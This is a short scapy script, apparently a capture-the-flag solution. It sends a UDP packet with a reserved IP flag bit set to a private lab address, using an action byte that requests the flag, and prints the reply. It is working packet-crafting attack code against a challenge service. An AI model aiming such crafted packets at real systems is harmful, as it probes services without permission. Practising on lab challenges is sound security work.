from scapy.all import IP, UDP, sr1, RandShort

# Hack to send to localhost
from scapy.all import conf, L3RawSocket
conf.L3socket = L3RawSocket

ACTION_PING = 0
ACTION_GET_FLAG = 1

pkt = IP(dst="10.42.0.1", flags=0b100)
pkt /= UDP(sport=RandShort(), dport=47138)
payload = bytearray()
payload.append(ACTION_GET_FLAG)
payload.append(0)
pkt /= payload
# print(payload)

res = sr1(pkt)
print(res.show())
